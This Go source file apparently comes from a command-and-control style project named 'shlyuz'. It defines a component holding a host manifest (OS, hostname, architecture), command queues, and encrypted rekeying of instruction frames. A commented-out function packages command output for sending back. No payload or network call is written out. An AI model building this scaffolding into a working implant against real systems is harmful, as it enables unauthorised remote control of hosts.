package component

import (
	"bytes"
	"encoding/json"

	"shlyuz/pkg/config"
	routine "shlyuz/pkg/crypto"
	"shlyuz/pkg/crypto/asymmetric"
	"shlyuz/pkg/instructions"
)

type Component struct {
	// logger             log.Logger
	ConfigFile         string
	ConfigKey          []byte
	Config             config.ShlyuzConfig
	ComponentId        string
	Manifest           ComponentManifest
	InitalKeypair      asymmetric.AsymmetricKeyPair
	InitalRemotePubkey asymmetric.PublicKey
	CurrentKeypair     asymmetric.AsymmetricKeyPair
	CmdProcessingQueue []byte
	CmdDoneQueue       []byte
	TmpChannel         chan []byte
}

type ComponentManifest struct {
	Id       string
	Os       string
	Hostname string
	Arch     string
}

func Rekey(frame instructions.Transaction, component Component) (Component, []byte, asymmetric.AsymmetricKeyPair) {
	rawRekeyFrame := instructions.CreateInstructionFrame(frame, true)
	rawFrameBytes := new(bytes.Buffer)
	json.NewEncoder(rawFrameBytes).Encode(rawRekeyFrame)
	rekeyFrame, newComponentKeypair := routine.PrepareTransmitFrame(rawFrameBytes.Bytes(), component.Config.CryptoConfig.PeerPk, component.CurrentKeypair.PrivKey, component.Config.CryptoConfig.XorKey)
	return component, rekeyFrame, newComponentKeypair
}

// func GetCmd(frame instructions.Transaction, component Component) (Component, bool) {

// }

// func SendOutput(component Component, event instructions.EventHist) instructions.Transaction {
// 	var outputArgs instructions.CmdOutput
// 	var OutputTransaction instructions.Transaction
// 	OutputTransaction.Cmd = "fcmd"
// 	OutputTransaction.ComponentId = component.ComponentId
// 	outputArgs.Ipk = component.CurrentKeypair.PubKey
// 	outputArgs.EventHistory = event
// 	rawOutputArgs := new(bytes.Buffer)
// 	json.NewEncoder(rawOutputArgs).Encode(outputArgs)
// 	OutputTransaction.Arg = rawOutputArgs.Bytes()
// 	return OutputTransaction
// }

func AckCmd(frame instructions.Transaction, component Component) bool {
	return true
}
